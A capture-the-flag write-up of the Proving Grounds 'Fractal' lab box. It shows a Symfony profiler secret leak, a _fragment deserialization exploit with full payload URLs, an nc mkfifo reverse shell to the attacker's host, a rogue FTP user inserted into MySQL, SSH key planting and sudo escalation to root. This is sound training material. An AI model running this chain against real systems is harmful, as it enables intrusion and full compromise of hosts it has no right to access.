---
layout: default
title: Fractal
parent: Proving Grounds Practice - Linux
nav_order: 2
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.232.233
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-21 23:43 EST
Nmap scan report for 192.168.232.233
Host is up (0.061s latency).
Not shown: 64453 closed tcp ports (reset), 1079 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries
|_/app_dev.php /app_dev.php/*
|_http-title: Welcome!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.21 seconds

```

# Enumeration

---

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/fractal/index.png)

![robots](../../../assets/images/ctfs/proving_grounds/fractal/robots.png)

Open _/app_dev.php_ page and see the Symfony panel in the bottom corner.

It indicates that the box is running in "debug" mode and the "\_profiler" is subsequently exposed.

![debug](../../../assets/images/ctfs/proving_grounds/fractal/debug.png)

Clicking on the "Profiler token e4759b0" link opens the _\_profiler_ page

![profiler](../../../assets/images/ctfs/proving_grounds/fractal/profiler.png)

Reading the following article on exploiting the Symfony web framework I was able to locate an exploit path.

[Symfony Web Framework Vulnerabilities Article](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

# Exploitation

---

The above referenced article indicates the _secret_ value can be obtained from the path _\_profiler/open?file=app/config/parameters.yml_

![secret](../../../assets/images/ctfs/proving_grounds/fractal/secret.png)

The following GitHub page has an exploit for Symfony web sites if the _secret_ value is known.

[Symfony Python Exploit](https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ python3 fractal.py http://192.168.152.233/_fragment -s 48a8538e6260789558f0dfe29861c05b
The URL /_fragment returns 403, cool

Trying 4 mutations...
  (OK) sha256 48a8538e6260789558f0dfe29861c05b http://192.168.152.233/_fragment 404 http://192.168.152.233/_fragment?_path=&_hash=xlppwYRWrcB3p2x1aD%2Ftr4bIPxuO9iyfDirq4Rhhtm4%3D

Trying both RCE methods...
  Method 1: Success!

PHPINFO: http://192.168.152.233/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=KmVEvFSwzOXxYTL%2Fs51GhobeilRrePdmLEDO%2FpWC5Zs%3D
RUN: fractal.py 'http://192.168.152.233/_fragment' --method 1 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.152.233/_fragment' --function phpinfo --parameters what:-1


```

![method2](../../../assets/images/ctfs/proving_grounds/fractal/method2.png)

Based on the exploit documentation we should be able to use "Method 2" to interact with the PHP web shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ python fractal.py http://192.168.152.233/_fragment --internal-url http://192.168.152.233/_fragment --secret '48a8538e6260789558f0dfe29861c05b' --method 2 --function system --parameters 'id' --algo sha256http://192.168.152.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522id%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&_hash=RP7LAofV4fd4Y%2F2BfO1y0I4eAM2fEk70or%2FiQtRA3J0%3D


```

![id](../../../assets/images/ctfs/proving_grounds/fractal/id.png)

Run a reverse shell parameter with a _nc mkfifo_ reverse shell payload.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ python fractal.py http://192.168.152.233/_fragment --internal-url http://192.168.152.233/_fragment --secret '48a8538e6260789558f0dfe29861c05b' --method 2 --function system --parameters 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.217 80 >/tmp/f' --algo sha256
http://192.168.152.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A74%253A%2522rm%2B%252Ftmp%252Ff%253Bmkfifo%2B%252Ftmp%252Ff%253Bcat%2B%252Ftmp%252Ff%257Csh%2B-i%2B2%253E%25261%257Cnc%2B192.168.45.217%2B80%2B%253E%252Ftmp%252Ff%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&_hash=%2BSXRz2bzwQn2g2mRyfyjYTH7LxJh87Vo7QwSzYzi3PY%3D
```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.152.233] 51146
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Run Linpeas.sh

Linpeas shows there is a MySQL service running on the loopback service.

![mysql](../../../assets/images/ctfs/proving_grounds/fractal/mysql.png)

![config](../../../assets/images/ctfs/proving_grounds/fractal/config.png)

![password](../../../assets/images/ctfs/proving_grounds/fractal/password.png)

The _phpmyadmin_ creds were a deadend.

## Search for string "password"

```bash
www-data@fractal:/etc$ grep -R "password" . 2>/dev/null

./proftpd/sql.conf:SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password

```

Connect to the _proftpd_ database

```bash
www-data@fractal:/var/www/html/web$ mysql -uproftpd -p
mysql -uproftpd -p
Enter password: protfpd_with_MYSQL_password

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| proftpd            |
+--------------------+
3 rows in set (0.06 sec)

mysql> use proftpd;
use proftpd;

```

[Article showing how to create generate Proftp DB password](https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf)

![proftpd](../../../assets/images/ctfs/proving_grounds/fractal/proftpd.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ /bin/echo "{md5}"`/bin/echo -n "password" | openssl dgst -binary -md5 | openssl enc -base64`
{md5}X03MO1qnZdYdgyfeuILPmQ==

```

Since there is a user _benoit_ on the system, if we create an FTP user of _benoit_ we can authenticate to the FTP service and add authorized*keys to the */home/benoit/.ssh\_ directory.

```bash
INSERT INTO ftpuser (userid, passwd, uid, gid, homedir, shell, count, accessed, modified) VALUES ('benoit', '{md5}X03MO1qnZdYdgyfeuILPmQ==', '1000', '1000', '/', '/bin/bash', '0', '2022-09-27 05:26:29', '2022-09-27 05:26:29');
Query OK, 1 row affected (0.01 sec)

mysql> select * from ftpuser;
select * from ftpuser;
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
| id | userid | passwd                        | uid  | gid  | homedir       | shell         | count | accessed            | modified            |
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
|  1 | www    | {md5}RDLDFEKYiwjDGYuwpgb7Cw== |   33 |   33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
|  2 | benoit | {md5}X03MO1qnZdYdgyfeuILPmQ== | 1000 | 1000 | /             | /bin/bash     |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)

```

Now we can authenticate to the FTP server and create/upload authorized_keys.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ ftp 192.168.152.233
Connected to 192.168.152.233.
220 ProFTPD Server (Debian) [192.168.152.233]
Name (192.168.152.233:vagrant): benoit
331 Password required for benoit
Password:
230 User benoit logged in
Remote system type is UNIX.
Using binary mode to transfer files.


# Create /home/benoit/.ssh directory
ftp> passive
passive
Passive mode on.
ftp> cd /home/benoit
cd /home/benoit
250 CWD command successful
ftp> mkdir .ssh
mkdir .ssh
257 "/home/benoit/.ssh" - Directory successfully created

# Copy generated RSA public key to an authorized_keys directory
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ sudo cp /home/vagrant/.ssh/id_rsa.pub authorized_keys

# PUT the authorized_keys directory onto the FTP server
ftp> cd /home/benoit/.ssh
250 CWD command successful
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||33388|)
150 Opening BINARY mode data connection for authorized_keys
100% |***********************************************************|   566       10.58 MiB/s    00:00 ETA
226 Transfer complete
566 bytes sent in 00:00 (9.39 KiB/s)


```

Now we can authenticate as _Benoit_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
└─$ ssh benoit@192.168.152.233 -i /home/vagrant/.ssh/id_rsa
The authenticity of host '192.168.152.233 (192.168.152.233)' can't be established.
ED25519 key fingerprint is SHA256:D9EwlP6OBofTctv3nJ2YrEmwQrTfB9lLe4l8CqvcVDI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.152.233' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 23 Nov 2023 06:10:28 AM UTC

  System load:  0.0               Processes:               223
  Usage of /:   60.2% of 9.74GB   Users logged in:         0
  Memory usage: 63%               IPv4 address for ens160: 192.168.152.233
  Swap usage:   0%


0 updates can be applied immediately.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ id
uid=1000(benoit) gid=1000(benoit) groups=1000(benoit)

```

## Check Sudo Privileges for Benoit

```bash
$ sudo -l
Matching Defaults entries for benoit on fractal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User benoit may run the following commands on fractal:
    (ALL) NOPASSWD: ALL

```

We have full Sudo permissions and can just switch to the "root" user

```bash
$ sudo su
root@fractal:/home/benoit# id
uid=0(root) gid=0(root) groups=0(root)

```
